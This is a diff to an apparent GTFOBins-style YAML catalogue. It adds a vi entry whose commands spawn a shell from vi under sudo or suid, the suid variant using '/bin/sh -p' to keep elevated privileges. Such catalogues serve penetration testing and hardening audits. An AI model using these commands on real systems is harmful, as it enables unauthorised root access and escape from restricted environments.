@@ -35,6 +35,15 @@ functions:
         shell: true
       unprivileged:
   - code: |-
+      vi -c ':set shell=/bin/sh | shell'
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          vi -c ':set shell=/bin/sh\ -p | shell'
+        shell: false
+      unprivileged:
+  - code: |-
       vi -c :terminal /bin/sh
     contexts:
       sudo:
